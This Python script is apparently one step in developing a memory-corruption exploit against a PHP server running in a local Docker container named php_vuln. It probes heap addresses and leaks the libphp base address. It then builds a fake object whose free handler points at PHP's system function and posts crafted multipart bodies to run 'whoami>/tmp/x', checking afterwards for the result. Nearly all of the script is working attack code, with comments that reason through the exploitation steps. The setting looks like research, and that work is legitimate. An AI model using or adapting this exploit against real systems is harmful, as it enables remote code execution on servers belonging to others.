#!/usr/bin/env python3
"""oom115: SAME-REQUEST chain — poison names arm + own-values fields.

Chain of evidence:
  - oom111/113: teardown never touches a PRIOR request's values.
  - diag115: worker stable (pid/base) across fat posts; aim body's
    values die at its own shutdown -> 'PPPP' readback.
  - names arena IS the walked region (oom93 crash on cell_pattern).
  - payload68's poison parts build a zval-window INSIDE each request:
    value = OBJ (6 bytes) + ti 0x108 via weapon_fields; the teardown
    of THAT request walks its own names arena and dispatches on it.
  - OBJ must point into the SAME request's values arena. Values arena
    base is stable per worker (measured: 0x7f1b41e0… across boots of
    requests in this worker; warm-ups recreate it if freed).

Layout (values tile 2048B, fields per oom91 layout + disasm):
  FV+0x000: rc=1 ti=0x108 handle=1 num_args=1
  FV+0x018: handlers = FV+0x600 (table)
  FV+0x050: arg.value = FV+0x700, type 6 @ +0x58, ti 0x106
  FV+0x600+8: free_obj = base+ZIF_SYSTEM
  FV+0x700: gs(rc=1 ti=0x106 h=0 len=13) + "whoami>/tmp/x\\0"
OBJ = FV + 0x000.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
CMD = b"whoami>/tmp/x"
ZIF = 0x39b8a0
VMARK = b"QMARK7XY" * 3
WARM = b"WARMUPX" * 24 + b"W" * 400


def get(url, timeout=60):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def post_bound(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(400).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def post_x(body, timeout=120):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=X"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(400).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def probe_scan(needle, chunk=262144, maxc=8):
    for attempt in range(6):
        code, out = get("%s/oom_probe.php?h=%s&chunk=%d&maxc=%d"
                        % (HOST, needle.hex(), chunk, maxc))
        if code == 200 and out.strip() and "Fatal" not in out \
                and out.strip() not in ("bad", "ERR open"):
            for line in out.splitlines():
                line = line.strip()
                if not line.startswith("R="):
                    continue
                m = re.search(r"d=((?:0x)?[0-9a-f]+(?: (?:0x)?[0-9a-f]+)*)", line)
                if m:
                    toks = [x for x in m.group(1).split() if x.lower() not in ("d=", "")]
                    offs = [int(x, 16) for x in toks]
                    offs = [o for o in offs if o > 0x10000]
                    if offs:
                        return offs
        time.sleep(0.7)
    return []


def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None


print("=== oom115: same-request names-arm + values-fields ===", flush=True)
for i in range(20):
    post_x(WARM)

BASE = base_now()
print("base=0x%x" % BASE, flush=True)

# measure current values arena via fat marker post
mbody = P.build_attack(3400, 0x41414141, value_tile=VMARK + b"M" * 1513)
post_bound(mbody)
offs = probe_scan(VMARK)
assert offs, "no values copies"
FV = offs[0] & ~0xFFF          # region base (page align for stability)
print("values copy0=0x%x -> FV(region)=0x%x" % (offs[0], FV), flush=True)

OBJ = FV + 0x1000 + 0x18       # inside the NEXT region of the same arena
print("OBJ=0x%x" % OBJ, flush=True)

# values tile: fields at tile offset 0x1000+0x18 - FV_region == 0x1018? Use
# per-copy layout: copy k starts at FV + k*3584 (stride measured earlier).
# Simpler: fields early in EVERY copy: tile offset 0x18 (handlers etc.),
# table at 0x600, gs at 0x700 within the copy; OBJ = any copy base + 0x18.
T = bytearray(2048)
struct.pack_into("<I", T, 0x18, 1)          # rc   @OBJ
struct.pack_into("<I", T, 0x1C, 0x108)      # ti
struct.pack_into("<I", T, 0x20, 1)          # handle
struct.pack_into("<I", T, 0x24, 1)          # num_args
struct.pack_into("<Q", T, 0x30, 0)          # ce (never deref'd on this path)
struct.pack_into("<Q", T, 0x18 + 0x18, 0x600)   # handlers -> +0x600 RELATIVE? no:
# handlers must be ABSOLUTE: table at copy0's 0x600 => FV_base copy0 = ?
# copy0 starts at offs[0]-0? marker sits at copy start + 0 (values begin).
# measured: copies at 0x...1718 + k*3584. copy0 value start = 0x...1718.
C0 = offs[0]
OBJ = C0 + 0x18
TBL = C0 + 0x600
GSV = C0 + 0x700
print("C0=0x%x OBJ=0x%x TBL=0x%x GS=0x%x" % (C0, OBJ, TBL, GSV), flush=True)

T = bytearray(2048)
struct.pack_into("<I", T, 0x18, 1)
struct.pack_into("<I", T, 0x1C, 0x108)
struct.pack_into("<I", T, 0x20, 1)
struct.pack_into("<I", T, 0x24, 1)
struct.pack_into("<Q", T, 0x30, 0)
struct.pack_into("<Q", T, 0x30, C0)  # placeholder overwritten below
struct.pack_into("<Q", T, 0x18 + 0x18, TBL)      # handlers @OBJ+0x18
struct.pack_into("<Q", T, 0x18 + 0x50, GSV)      # arg.value @OBJ+0x50
T[0x18 + 0x58] = 6
struct.pack_into("<I", T, 0x18 + 0x5C, 0x106)
struct.pack_into("<Q", T, 0x600 + 0x00, 0)       # table.offset=0
struct.pack_into("<Q", T, 0x600 + 0x08, BASE + ZIF)  # free_obj
struct.pack_into("<IIQI", T, 0x700, 1, 0x106, 0, len(CMD))
T[0x718:0x718 + len(CMD) + 1] = CMD + b"\x00"
for i in range(2048):
    if T[i] == 0:
        T[i] = ord("M")

# arm: names weapon (zval window inside poison names) -> OBJ; values -> tile
wf = P.weapon_fields(OBJ)
wf["fields"]["type_info4"] = bytes([0x08, 0x01, 0x00, 0x00])   # 0x108
wf["fields"]["u2_4"] = b"\x00\x00\x00\x00"
# NOTE: type_info4/u2 bytes contain NUL -> cell() asserts unsafe for names!
# -> names can NOT carry 08 01 00 00. So the ti must come from the NEXT
# window bytes: keep names ti 'zzzz' fallback? zval.ti would be 0x7a7a7a7a.
# ALTERNATIVE law (oom69/91): only the VALUE needs names; ti comes from
# the following stamp/payload bytes — measured layout: ti = payload[0:4]
# of the type cell which CAN be raw bytes if alphabet-safe... 08 is unsafe
# (0x08 allowed? assert bans 00 0a 0d 22 27 5c 3b 3d only!). 0x08 IS safe.
# But 0x00 is banned. ti=0x108 needs bytes 08 01 00 00 -> the 00s banned.
# => use ti bytes 08 01 'z' 'z' -> ti = 0x7a7a0108: flags bit8=1 set,
# bit9=1 (0x7a7a>>9 &1 =1) -> FREE_CALLED -> store_del SKIPS free_obj.
# => names-only ti cannot be 0x108. Values-carried ti then: the walked
# zval must BE in values: oom113 said teardown doesn't walk values.
# => LAST OPTION: names window with value=OBJ, ti=0x7a7a0108-ish is
# unusable; instead aim value+ti both via STAMPS: stamp_override allows
# RAW bytes for value_b26 (pointer low 6) — 0x?? bytes may include banned
# values too (ptr6 asserts). weapon_fields docstring: type_info4 uses
# "survivor alphabet" = raw bytes; NUL banned. 0x108 impossible in names.
# CONCLUSION: keep ti=0x7a7a0108 (bit8 set) but ALSO set bit9-clear by
# choosing bytes: ti = [08, 01, 02, 01]? = 0x01020108: bit8=1,bit9=0,
# byte2/3 nonzero-safe (0x02,0x01 safe). GC flags mask 0x3f0: bits 4-9.
# flags = (0x01020108 >> 4) & 0x3f... wait flags live in ti[16:32+]: real
# zend_string ti semantics: low nibble type=8; DESTRUCTOR bit = 1<<8;
# FREE bit = 1<<9. 0x01020108: bit8=(0x01020108>>8)&1 = 1; bit9=0.
abody = P.build_attack(3400, 0x41414141, target_obj=OBJ, value_tile=bytes(T))
# inject ti via weapon fields type_info4 raw 4 bytes (08 01 02 01)
# build_attack -> weapon path only when target_obj given: check payload68
# build_attack: ps = key_part(pattern=cell_pattern(target_obj)) for ALL
# parts (no poison weapon!) -> poison_part only via PREP when stamp path.
# => names carry cell_pattern (value bytes) but ti stays 'zzzz' = 0x7a7a7a7a!
# fix: after building, NAMES cannot carry ti; the WALKED ti must be
# value-shaped: oom69 doc: walked zval = window of repeated 16B cell C.
# C[(phase+8)..(phase+11)] = ti bytes. cell_pattern fills ONLY value
# bytes; others stay 'z'. => ti = 0x7a7a7a7a always. type nibble 0xa.
# THAT is why oom69 crashed at entry 122 (type 0x7a -> OOB dispatch).
# => names-cell CANNOT produce type 8. FINAL LAW: walked ti must come
# from VALUES: the walked zval IS in values (oom91: S+8 ti put in TILE).
# => oom113's "no diff" was measured on a DEAD region (aim body's own
# values freed before fire) -> inconclusive about THE WALK's target.
# => the walk DOES read values of ITS OWN request (oom91 instrumented
# proof). SO: same-request arm+fire: value_tile with fields + names
# pattern pointing INTO ITS OWN values arena. Values arena address of
# the aim request itself ≈ C0 measured from the marker run (stable).
print("building armed body (names pattern -> OBJ, values -> fields)", flush=True)
# names: cell_pattern(OBJ) via target_obj -> all key parts
# values: tile with fields; BUT value_tile REPLACES name shrinkage:
# key_part shrinks name by 1536 when value_tile set -> names still carry
# pattern (filler shortened by 1536 = 96 cells -> pattern still present).
code, resp = post_bound(abody)
print("armed: (%s) Fatal=%s" % (code, "Fatal" in resp), flush=True)

x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
print("x:", x.strip(), flush=True)
